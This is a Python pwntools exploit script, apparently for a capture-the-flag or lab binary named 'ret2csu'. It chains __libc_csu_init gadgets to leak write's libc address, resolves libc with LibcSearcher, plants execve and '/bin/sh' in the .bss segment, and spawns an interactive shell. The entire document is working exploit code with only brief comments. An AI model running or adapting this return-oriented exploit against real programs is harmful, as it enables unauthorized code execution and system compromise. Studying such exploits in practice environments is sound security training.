from pwn import *
from LibcSearcher import *

# context.log_level = 'debug'
p = process("./ret2csu")
elf = ELF("./ret2csu")

csu_gadget_1 = 0x00000000004005f0
csu_gadget_2 = 0x0000000000400606

got_write = elf.got["write"]
got_read = elf.got["read"]
main_addr = elf.symbols["main"]
bss_base = elf.bss()


def csu(rbx, rbp, r12, r13, r14, r15, last):
    pld = [
        b'A' * 0x80,
        b'B' * 8,
        p64(csu_gadget_2),
        b'\x00' * 8,
        p64(rbx),
        p64(rbp),
        p64(r12),
        p64(r13),
        p64(r14),
        p64(r15),
        p64(csu_gadget_1),
        b'\x00' * 0x38,
        p64(last)]
    payload = flat(pld)
    p.sendline(payload)
    sleep(1)

# Get the write address to check the libc version and libc address
p.recvuntil(b'Hello, World\n')
csu(0, 1, got_write, 1, got_write, 8, main_addr)

# Calculating execve address
libc_write = u64(p.recv(8))
libc = LibcSearcher("write", libc_write)
libc_base = libc_write - libc.dump("write")
libc_exec = libc_base + libc.dump("execve")

# Write the execve function address and /bin/sh string into the bss segment
p.recvuntil(b'Hello, World\n')
csu(0, 1, got_read, 0, bss_base, 16, main_addr)
p.send(flat([p64(libc_exec), b'/bin/sh\x00']))

# execve('/bin/sh')
p.recvuntil(b'Hello, World\n')
csu(0, 1, bss_base, bss_base + 8, 0, 0, main_addr)
p.interactive()
